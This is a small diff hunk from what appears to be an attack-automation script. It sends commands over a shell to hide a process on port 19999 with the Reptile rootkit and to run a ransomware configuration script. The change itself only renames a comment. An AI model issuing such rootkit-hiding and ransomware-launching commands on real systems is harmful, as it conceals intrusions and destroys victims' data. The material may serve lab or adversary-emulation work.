@@ -52,7 +52,7 @@ def main(argv):
     # shell.write('/reptile/reptile_cmd hide $tmppid')
     shell.write('/reptile/reptile_cmd hide $(lsof -i :19999 | awk \'{print $2}\' | sed -n 2p)')
     time.sleep(10)
-    # ransomware
+    # 03_ransomware
     shell.write('./randomware/randomware_config.sh')
 
 
